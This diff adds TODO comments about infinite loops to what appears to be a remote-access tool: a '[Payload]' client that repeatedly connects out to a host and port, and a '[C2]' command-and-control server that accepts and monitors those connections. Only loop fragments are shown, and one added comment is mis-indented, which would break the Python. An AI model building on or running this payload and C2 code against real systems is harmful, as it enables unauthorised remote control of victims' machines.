@@ -54,6 +54,7 @@ def main():
     
     print(f"[Payload] Connecting to {HOST}:{PORT}")
     
+    # TODO: Ensure loop has proper exit condition
     while True:
         try:
             sock = socket.socket()
@@ -140,6 +141,7 @@ def handle_client(conn, addr):
     print(f"[C2] New connection: {conn_id}")
     
     try:
+    # TODO: Review - infinite loop may need exit condition
         while True:
             # Keep connection alive
             time.sleep(10)
@@ -153,6 +155,7 @@ def handle_client(conn, addr):
 
 def monitor_connections():
     """Monitor and display connections"""
+    # TODO: Review - infinite loop may need exit condition
     while True:
         time.sleep(5)
         if connections:
@@ -174,6 +177,7 @@ monitor_thread.start()
 
 # Accept connections
 try:
+    # TODO: Review - infinite loop may need exit condition
     while True:
         conn, addr = server.accept()
         client_thread = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
